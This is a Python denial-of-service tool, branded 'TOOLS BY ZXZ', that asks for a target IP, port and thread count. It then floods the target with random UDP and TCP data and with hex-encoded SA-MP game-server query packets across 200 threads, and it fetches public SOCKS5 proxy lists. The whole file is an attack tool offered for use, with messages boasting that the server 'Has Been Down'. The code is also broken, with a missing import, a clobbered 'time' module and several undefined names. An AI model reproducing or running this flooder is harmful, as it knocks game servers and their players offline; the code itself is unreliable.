import random
import threading
import codecs
import struct
import time
import socket
import sys
import os

Pacotes = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e76', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e67', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('021efd53', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]
     
os.system("clear")
print ("\033[31m                      ╔═════════════════════════════════╗")
print ("\033[31m                      ║\033[34m ╔═╗╦ ╦╦╔═╦ ╦╔╗╔╔═╗\033[31m  ╦╔╗ ╦  ╦╔═╗ \033[31m║")
print ("\033[31m                      ║\033[34m ╚═╗║ ║╠╩╗║ ║║║║╠═╣\033[31m  ║╠╩╗║  ║╚═╗ \033[31m║")
print ("\033[31m                      ║\033[34m ╚═╝╚═╝╩ ╩╚═╝╝╚╝╩ ╩\033[31m  ╩╚═╝╩═╝╩╚═╝ \033[31m║")
print ("\033[31m                      ╚═════════════════════════════════╝")
print ("\033[31m                              ╔══════════════════╗")
print ("\033[31m                              ║ \033[35m  TOOLS BY \033[34mZXZ  \033[31m ║") 
print ("\033[31m                              ╚══════════════════╝")

ip = str(input("\033[96m  Attack To IP \033[35m \033[91m "))
port = int(input("\033[96m  Attack To Port \033[35m \033[91m "))
choice = str(input("\033[96m  Attack \033[35m \033[91m "))
time = int(input("\033[96m  Times \033[35m \033[91m "))
size = int(input("\033[96m  Threads \033[35m \033[91m "))
fake_ip = '182.21.20.32'
def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  randip5 = random.randint(1,255)
  randip6 = random.randint(1,255)
  randip7 = random.randint(1,255)
  randip8 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)
  randip.append(randip5)
  randip.append(randip6)
  randip.append(randip7)
  randip.append(randip8)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)
  
def getproxy():
    global proxies
    f = open(f'{nprox}.txt','wb')
    r = requests.get(urlproxy)
    f.write(r.content)
    f.close()
    proxies = open(f'{nprox}.txt').readlines()

def proxyask():
    global urlproxy
    pro = input(f'[~] Get New List {nprox} [Y] : ')
    if pro == "Y":
        urlproxy = "https://www.proxy-list.download/api/v1/get?type=socks5"
        urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=5000&country=all&ssl=yes&anonymity=all"
        getproxy()
        askthreads()
    else:
        proxyask()  

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),
                       codecs.decode("081e62da","hex_codec"),
                       codecs.decode("081e77da","hex_codec"),
                       codecs.decode("081e4dda","hex_codec"),
                       codecs.decode("021efd40","hex_codec"),
                       codecs.decode("081e7eda","hex_codec"), 
                       ]
def run():
	data = random._urandom(1021)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[31m ZXZ Has Been Attack To Server")
		except:
			print("\u001b[31m Server Has Been Down")

def run2():
	data = random._urandom(666)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ZXZ Has Been Attack To Server")
		except:
			s.close()
			print("\u001b[31m Server Has Been Down")
            

def run3():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ZXZ Has Been Attack To Server")
		except:
			s.close()
			print("\u001b[31m Server Has Been Down")
            
  
def run4():
	data = random._urandom(21)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ZXZ Has Been Attack To Server")
		except:
			s.close()
			print("\u001b[31m Server Has Been Down")
			
def run5():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ZXZ Has Been Attack To Server")
		except:
			s.close()
			print("\u001b[31m Server Has Been Down")
            

class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                                   
		
if __name__ == '__main__':
    try:
        for x in range(200):
            mythread = MyThread()
            mythread.start()
            time.sleep(.1)
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ("╔════════════════════════════════════╗")
        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
        print ("╚════════════════════════════════════╝")
        print ('\n\n')
        print ('STOP TO ATTACK {}').format(orgip)
         